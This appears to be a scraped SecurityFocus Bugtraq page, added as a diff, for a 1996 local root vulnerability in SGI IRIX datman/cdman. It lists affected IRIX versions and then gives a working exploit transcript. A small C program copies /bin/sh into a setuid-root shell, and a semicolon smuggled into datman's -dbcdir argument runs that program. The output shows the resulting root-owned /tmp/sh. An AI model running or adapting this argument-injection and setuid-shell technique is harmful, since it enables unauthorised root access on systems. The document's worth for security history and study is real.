@@ -1,0 +1,128 @@
+#SpeeDr00t@Black Falcon<br>#bid347<p><b><span style="font-size: 18pt;">IRIX datman/cdman Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/347/info">info</a><br><a href="http://www.securityfocus.com/bid/347/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/347/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/347/solution">solution</a><br><a href="http://www.securityfocus.com/bid/347/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				347
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 09 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 09 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This bug was reported to the Bugtraq mailing list on December 9, 1996 by Yuri Volobuev &lt;volobuev@t1.chem.umn.edu&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SGI IRIX 6.4 <br/>
+					
+				
+					SGI IRIX 6.3 <br/>
+					
+				
+					SGI IRIX 6.1 <br/>
+					
+				
+					SGI IRIX 6.0.1 XFS<br/>
+					
+				
+					SGI IRIX 6.0.1 <br/>
+					
+				
+					SGI IRIX 6.0 <br/>
+					
+				
+					SGI IRIX 5.3 <br/>
+					
+				
+					SGI IRIX 5.2 <br/>
+					
+				
+					SGI IRIX 5.1.1 <br/>
+					
+				
+					SGI IRIX 5.1 <br/>
+					
+				
+					SGI IRIX 5.0.1 <br/>
+					
+				
+					SGI IRIX 5.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	% cat &gt; /tmp/makesh.c<br/>    main()<br/>    {<br/>      seteuid(0); setegid(0);<br/>      system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");<br/>    }<br/>% cc /tmp/makesh.c -o /tmp/makesh<br/>% mv .cddb .cddb.old<br/>% touch .cdplayerrc<br/>% /usr/sbin/datman -dbcdir "/tmp/blah;/tmp/makesh"<br/>      Created "/tmp/blah"<br/>     Converting /home/medc2/yuri/.cdplayerrc into /tmp/blah<br/>% ls -l /tmp/sh<br/> -r-sr-sr-x    1 root     sys       140784 Dec  9 15:24 /tmp/sh*
+	
+		<ul>
+</ul>
+</div>
